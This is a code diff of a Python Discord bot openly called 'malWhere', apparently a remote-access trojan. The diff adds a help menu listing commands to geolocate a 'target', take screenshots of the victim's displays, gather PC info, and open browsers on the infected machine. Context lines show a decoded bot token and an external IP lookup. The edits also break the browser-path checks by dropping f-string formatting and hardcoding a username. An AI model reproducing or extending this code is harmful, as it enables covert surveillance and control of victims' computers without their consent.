@@ -41,6 +41,7 @@ decryp5 = sample_string_bytes.decode("ascii")
 TOKEN=decryp5
 
 malWhere = commands.Bot(command_prefix='$')
+malWhere.remove_command('help')
 
 r = requests.get('https://api.ipify.org?format=json')
 response=r.json()
@@ -65,7 +66,33 @@ async def on_ready():
       await infectionschannel.send(embed=embed)
   except:
     ctx.message.send("An Error Has Occured Please Try Again")
-
+   
+@malWhere.command()
+async def help(ctx,type):
+  if type=="help":
+    embed=discord.Embed(title="Help", description="malWhere's Help Menu", color=0xFF5733)
+    embed.add_field(name="Help help", value="$help- shows this menu", inline=False)
+    embed.add_field(name="General help", value="$help general - shows the general help menu", inline=False)
+    embed.add_field(name="Trolling help", value="$help trolling - shows the trolling help menu", inline=False)
+    await ctx.send(embed=embed)
+    await ctx.message.delete()
+  else:
+    if type=="general":
+      embed=discord.Embed(title="General Help", description="malWhere's General commands Help Menu",color=0xFF5733)
+      embed.add_field(name="Geolocate", value="use $geolocate to locate your target", inline=False)
+      embed.add_field(name="Screenshot", value="use $screenshot to take a screenshot of the targets displays", inline=False)
+      embed.add_field(name="PC Info", value="Use $pcinfo to gather basic information about the victim pc", inline=False)
+      await ctx.send(embed=embed)
+      await ctx.message.delete()
+    else:
+      if type=="trolling":
+        embed=discord.Embed(title="Trolling Help", description="malWhere's Trolling Help Menu", color=0xFF5733)
+        embed.add_field(name="Rickroll", value="Ahhh such a clasic use $rickroll to get that exquisite trolling experience only rick can deliver", inline=False)
+        await ctx.send(embed=embed)
+        await ctx.message.delete()
+      else:
+        ctx.message.send("Invalid help type try again")
+        
 @malWhere.command()
 async def geolocate(ctx):
   try:
@@ -125,7 +152,7 @@ async def pcinfo(ctx):
 @malWhere.command()
 async def rickroll(ctx):
   try:
-    existing_chrome=f"C:/Users/{getpass.getuser()}/AppData/Local/Google/Chrome"
+    existing_chrome="C:/Users/{getpass.getuser()}/AppData/Local/Google/Chrome"
     if existing_chrome:
       os.popen("start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
       
@@ -133,15 +160,15 @@ async def rickroll(ctx):
     if existing_opera:
       os.popen("start opera.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
       
-    existing_firefox=f"C:/Users/{getpass.getuser()}/AppData/Local/Mozilla/Firefox"
+    existing_firefox="C:/Users/{getpass.getuser()}/AppData/Local/Mozilla/Firefox"
     if existing_firefox:
       os.popen("start firefox.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
       
-    existing_brave=f"C:/Users/{getpass.getuser()}/AppData/Local/BraveSoftware/Brave-Browser"
+    existing_brave="C:/Users/jorda/AppData/Local/BraveSoftware/Brave-Browser"
     if existing_brave:
       os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
       
-    existing_edge=f"C:/Users/{getpass.getuser()}/AppData/Local/Microsoft/Edge"
+    existing_edge="C:/Users/{getpass.getuser()}/AppData/Local/Microsoft/Edge"
     if existing_edge:
       os.popen("start MicrosoftEdge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
       
